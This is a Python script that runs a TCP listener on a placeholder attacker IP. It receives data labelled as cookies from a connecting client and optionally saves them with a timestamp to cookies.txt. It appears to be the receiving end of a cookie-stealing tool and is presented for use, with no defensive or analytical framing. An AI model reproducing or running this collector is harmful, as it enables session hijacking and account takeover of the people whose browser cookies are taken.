from datetime import datetime
import socket
import threading
from colorama import Fore, Style

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

addr = ("YOUR IP HERE", 8888)
s.bind(addr)

s.listen(1)
print(
    f"{Fore.BLUE} Server is listening at {addr[0]}:{addr[1]}{Style.RESET_ALL}")


def handle_tcp(sock, addr):
    print(f"{Fore.GREEN}New Connection From {Fore.LIGHTBLUE_EX} %s:%s {Style.RESET_ALL}" % addr)

    while True:
        data = sock.recv(1024).decode()
        if not data:
            break

        if not data == "False":
            print(f"{Fore.RED} {data} {Style.RESET_ALL}")

            answer = ""
            while answer.lower() not in ("yes", "no"):
                answer = input(
                    f"Do you want to save this cookie as file? {Fore.CYAN}[Yes/No]{Style.RESET_ALL}: ")
                answer = answer.lower()
                if answer in "yes":
                    with open('cookies.txt', 'w') as f:
                        f.write(datetime.now().strftime(
                            "%Y-%m-%d %H:%M:%S") + "\n" + str(data) + "\n")

                input(f"{Fore.GREEN}Press Enter to close{Style.RESET_ALL}")

        else:
            print(f"[INFO]{Fore.RED} No cookie found {Style.RESET_ALL}")
            input(f"{Fore.GREEN}Press Enter to close{Style.RESET_ALL}")

        break

    sock.close()


if __name__ == '__main__':
    sock, addr = s.accept()
    threading.Thread(target=handle_tcp, args=(sock, addr)).start()
